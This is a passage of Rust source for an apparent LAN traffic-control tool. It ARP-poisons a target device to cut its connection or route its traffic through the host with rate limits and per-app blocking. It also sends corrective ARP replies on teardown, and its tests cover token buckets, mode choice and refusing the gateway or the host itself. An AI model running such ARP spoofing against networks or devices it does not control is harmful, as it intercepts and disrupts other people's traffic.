            // Allowlist mode keeps the target online at full speed too -
            // the allowlist decides what passes the forwarder.
            (Mode::Cut, ForwardPolicy::Allow { .. }) => (u64::MAX, u64::MAX),
            (Mode::Shape { down_bps, up_bps }, _) => (*down_bps, *up_bps),
            (Mode::Cut, ForwardPolicy::DropAll) => (0, 0),
        };
        let plan = RatePlan {
            down_bps: down_rate,
            up_bps: up_rate,
            burst_mult: burst_multiplier(session.config.priority.as_deref()),
        };
        let forwarder = {
            let stop_fwd = Arc::clone(&stop);
            let lib = Arc::clone(&self.lib);
            let ctx2 = Arc::clone(&ctx);
            let stats_fwd = Arc::clone(&stats);
            let policy_fwd = policy;
            Some(std::thread::spawn(move || {
                forwarder_loop(lib, ctx2, stop_fwd, plan, policy_fwd, stats_fwd);
            }))
        };

        *self.active.lock().unwrap() = Some(TaskHandles {
            stop,
            poison: Some(poison),
            forwarder,
            stats: Some(Arc::clone(&stats)),
        });

        match mode {
            Mode::Cut => tracing::warn!(target = %ctx.target_ip, "arp-cut ACTIVE (isolation)"),
            Mode::Shape { down_bps, up_bps } => tracing::warn!(
                target = %ctx.target_ip,
                down_bps,
                up_bps,
                "arp-shaper ACTIVE (target traffic routed through this PC with limits)"
            ),
        }
        Ok(())
    }

    async fn teardown(&self, session: &Session) -> CoreResult<()> {
        self.stop_tasks().await;
        let ctx = build_context(&self.lib, session)?;
        let target = ctx.target_ip;
        let lib = Arc::clone(&self.lib);
        let res = tokio::task::spawn_blocking(move || send_correctives(&ctx, &lib))
            .await
            .map_err(|e| CoreError::Backend(format!("join error: {e}")))?;
        tracing::info!(target = %target, "arp backend: corrective ARP replies sent");
        res
    }

    async fn verify_restoration(
        &self,
        _session_id: uuid::Uuid,
        captured: &CapturedState,
    ) -> CoreResult<()> {
        if self.active.lock().unwrap().is_some() {
            return Err(CoreError::VerificationFailed(
                "poison/forward loops still running".into(),
            ));
        }
        // Re-broadcast the journaled corrective announcements: both hosts
        // re-learn their true mappings from these.
        for action in &captured.actions {
            if let RestorationAction::RestoreNeighborEntry { ip, mac } = action {
                let Ok(ip) = ip.parse::<Ipv4Addr>() else {
                    continue;
                };
                let Ok(mac) = parse_mac(mac) else {
                    continue;
                };
                ArpCutBackend::announce(&self.lib, ip, mac)
                    .map_err(|e| CoreError::VerificationFailed(e.to_string()))?;
            }
        }
        tracing::info!("arp backend: restoration announcements re-sent and verified");
        Ok(())
    }
}

impl ArpCutBackend {
    async fn stop_tasks(&self) {
        let task = self.active.lock().unwrap().take();
        if let Some(mut task) = task {
            task.stop.store(true, Ordering::SeqCst);
            if let Some(t) = task.poison.take() {
                let _ = tokio::task::spawn_blocking(move || t.join()).await;
            }
            if let Some(t) = task.forwarder.take() {
                let _ = tokio::task::spawn_blocking(move || t.join()).await;
            }
        }
    }

    /// Fire-and-forget corrective announcements (broadcast gratuitous
    /// replies) for `ip -> mac`. Used by the restoration executor so the
    /// watchdog can heal poisoned hosts without app state.
    pub fn announce(lib: &Arc<PcapLib>, ip: Ipv4Addr, mac: [u8; 6]) -> CoreResult<()> {
        let (device, _sel) =
            resolve_device(lib, ip).map_err(|e| CoreError::Backend(e.to_string()))?;
        let frame = arp_gratuitous_frame(mac, ip);
        lib.with_sender(&device, |sender| {
            for _ in 0..CORRECT_BURST {
                sender.send(&frame)?;
                std::thread::sleep(CORRECT_SPACING);
            }
            Ok(())
        })
        .map_err(|e| CoreError::Backend(e.to_string()))
    }
}

/// Session priority -> token-bucket burst multiplier. Priority does not
/// change the average rate limit; it changes how much the device may burst
/// above it (responsiveness for gaming/video calls vs. bulk fairness).
fn burst_multiplier(priority: Option<&str>) -> f64 {
    match priority {
        Some("low") => 0.5,
        Some("high") => 2.0,
        Some("max") => 4.0,
        _ => 1.0,
    }
}

fn format_mac(mac: &[u8; 6]) -> String {
    format!(
        "{:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use banden_core::models::SessionConfig;
    use banden_core::SessionStateMachine;

    fn session(ip: &str, mac: &str, down: Option<u64>, up: Option<u64>) -> Session {
        Session {
            id: uuid::Uuid::new_v4(),
            config: SessionConfig {
                target_mac: mac.into(),
                target_ip: ip.into(),
                target_label: None,
                download_limit_bps: down,
                upload_limit_bps: up,
                duration_secs: None,
                blocked_apps: Vec::new(),
                allowed_apps: Vec::new(),
                priority: None,
            },
            machine: SessionStateMachine::new(),
            created_at: chrono::Utc::now(),
            started_at: None,
            ended_at: None,
            error: None,
        }
    }

    #[test]
    fn blocked_cidr_matches_wire_order_bytes() {
        // Regression: the forwarder used to hand wire bytes to ip_blocked
        // via from_ne_bytes (little-endian on x86), so app CIDRs - the only
        // guard on cached endpoints and established flows - never matched.
        // Seen live: WhatsApp session forwarded 157.240.212.16 frames even
        // though 157.240.212.0/24 is in its catalog entry.
        let blocked = CompiledBlocked::from_ids(&["whatsapp".to_string()]);
        assert!(!blocked.apps.is_empty());
        let wire: [u8; 4] = [157, 240, 212, 16];
        assert!(blocked.ip_blocked(wire_ip_u32(wire)));
        let outside: [u8; 4] = [8, 8, 8, 8];
        assert!(!blocked.ip_blocked(wire_ip_u32(outside)));
    }

    #[test]
    fn mode_selection_follows_limits() {
        assert_eq!(
            mode_for(&session("192.168.8.4", "AA:BB:CC:DD:EE:01", None, None)),
            Mode::Cut
        );
        assert_eq!(
            mode_for(&session(
                "192.168.8.4",
                "AA:BB:CC:DD:EE:01",
                Some(1_000_000),
                Some(1_000_000)
            )),
            Mode::Shape {
                down_bps: 1_000_000,
                up_bps: 1_000_000
            }
        );
        // One-sided limit still shapes; the other direction is unlimited.
        assert!(matches!(
            mode_for(&session(
                "192.168.8.4",
                "AA:BB:CC:DD:EE:01",
                Some(1_000_000),
                None
            )),
            Mode::Shape {
                up_bps: u64::MAX,
                ..
            }
        ));
    }

    #[test]
    fn token_bucket_enforces_rate() {
        let mut b = TokenBucket::new(1_000_000, 1.0); // 1 Mbps = 125,000 B/s
        let mut sent = 0;
        for _ in 0..50 {
            if b.take(1500) {
                sent += 1;
            }
        }
        // Bucket allows a burst then drops; must not forward all 50.
        assert!(sent < 50, "bucket must throttle, sent={sent}");
        assert!(sent >= 2, "bucket must allow some burst, sent={sent}");
        // After enough time, tokens refill.
        std::thread::sleep(Duration::from_millis(120));
        assert!(b.take(1500), "tokens should refill over time");
    }

    #[test]
    fn unlimited_bucket_never_drops() {
        let mut b = TokenBucket::new(u64::MAX, 1.0);
        for _ in 0..1000 {
            assert!(b.take(1500));
        }
    }

    #[test]
    fn poison_frames_depends_on_mode() {
        let ctx = Context {
            device: "x".into(),
            our_mac: [1; 6],
            our_ip: "192.168.8.16".parse().unwrap(),
            gateway_ip: "192.168.8.1".parse().unwrap(),
            gateway_mac: [2; 6],
            target_ip: "192.168.8.4".parse().unwrap(),
            target_mac: [3; 6],
        };
        assert_eq!(poison_frames(&ctx, Mode::Cut).len(), 1);
        assert_eq!(
            poison_frames(
                &ctx,
                Mode::Shape {
                    down_bps: 1,
                    up_bps: 1
                }
            )
            .len(),
            1
        );
        // Corrective unicast goes to the gateway only (+ broadcast).
        assert_eq!(corrective_unicast(&ctx).len(), 1);
        assert_eq!(corrective_broadcast(&ctx).len(), 42);
    }

    #[test]
    fn interface_for_target_picks_subnet_owner() {
        use banden_core::InterfaceInfo;
        let mk = |id: &str, ip: &str, cidr: &str| InterfaceInfo {
            id: id.into(),
            if_index: Some(1),
            name: id.into(),
            friendly_name: None,
            mac_address: None,
            ipv4: Some(ip.into()),
            prefix_len: Some(24),
            cidr: Some(cidr.into()),
            gateway: None,
            is_up: true,
            is_loopback: false,
            is_physical: true,
        };
        let list = vec![
            mk("eth", "192.168.8.16", "192.168.8.0/24"),
            mk("vpn", "10.44.0.2", "10.44.0.0/16"),
        ];
        let a: Ipv4Addr = "192.168.8.4".parse().unwrap();
        let b: Ipv4Addr = "10.44.9.9".parse().unwrap();
        let c: Ipv4Addr = "172.16.0.1".parse().unwrap();
        assert_eq!(interface_for_target(&list, a).unwrap().id, "eth");
        assert_eq!(interface_for_target(&list, b).unwrap().id, "vpn");
        assert!(interface_for_target(&list, c).is_some());
    }

    #[tokio::test]
    async fn prepare_refuses_gateway_and_self() {
        let backend = match ArpCutBackend::new() {
            Ok(b) => b,
            Err(_) => return, // no wpcap on this machine
        };
        // Gateway as target must be refused.
        let s = session("192.168.8.1", "22:99:FE:E7:89:B1", None, None);
        let err = backend.prepare(&s).await.unwrap_err();
        assert_eq!(err.code(), "invalid_config");
        // This PC as target must be refused.
        let s = session("192.168.8.16", "34:5A:60:C7:D7:B7", None, None);
        let err = backend.prepare(&s).await.unwrap_err();
        assert_eq!(err.code(), "invalid_config");
    }
}
